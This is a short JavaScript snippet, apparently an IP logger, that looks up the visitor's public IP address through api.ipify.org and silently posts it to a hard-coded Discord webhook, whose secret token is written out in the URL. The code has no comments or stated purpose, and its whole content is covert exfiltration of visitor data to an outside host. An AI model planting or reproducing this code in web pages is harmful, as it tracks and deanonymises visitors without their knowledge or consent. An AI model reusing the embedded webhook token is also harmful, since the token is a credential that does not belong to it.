var ip = '';
fetch('https://api.ipify.org?format=json')
.then(function(response) {
    return response.json();
})
.then(function(data) {
    ip = data.ip;
    var webhook = 'https://canary.discord.com/api/webhooks/1125397059659386950/MyAiV8-908g6vNHkLOcZTP8TrqFta3_gXWzfevHmWGUxhKXeR2vBbyd9Z0H3qx52WK1V'
    var message = {
        content: 'IP : ' + ip
    };

    fetch(webhook, {
        method: 'POST',
        headers: {
            'Content-Type': 'application/json'
        },
        body: JSON.stringify(message)
    });
});